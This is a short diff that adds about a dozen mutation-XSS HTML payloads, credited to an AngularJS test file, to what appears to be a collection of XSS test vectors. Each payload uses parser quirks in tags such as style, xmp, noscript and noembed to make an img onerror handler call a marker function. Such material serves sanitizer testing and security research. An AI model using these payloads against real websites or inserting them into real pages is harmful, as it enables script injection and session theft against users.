@@ -605,7 +605,21 @@ XXX
 
 <noembed><svg><b><style><b title='</style><img>'>
 
- 
+ // update mXSS from AngularJS 
+  // https://github.com/angular/angular.js/blob/master/test/jqLiteSpec.js#L224
+ <img alt="<x" title="/><img src=url404 onerror=xss(0)>">
+<img alt="\n<x" title="/>\n<img src=url404 onerror=xss(1)>">
+<style><style/><img src=url404 onerror=xss(2)>
+<xmp><xmp/><img src=url404 onerror=xss(3)>
+<title><title /><img src=url404 onerror=xss(4)>
+<iframe><iframe/><img src=url404 onerror=xss(5)>
+<noframes><noframes/><img src=url404 onerror=xss(6)>
+<noscript><noscript/><img src=url404 onerror=xss(7)>
+<foo" alt="" title="/><img src=url404 onerror=xss(8)>">
+<img alt="<x" title="" src="/><img src=url404 onerror=xss(9)>">
+<noscript/><img src=url404 onerror=xss(10)>
+<noembed><noembed/><img src=url404 onerror=xss(11)>
+<option><style></option></select><img src=url404 onerror=xss(12)></style>
 
 
 ```
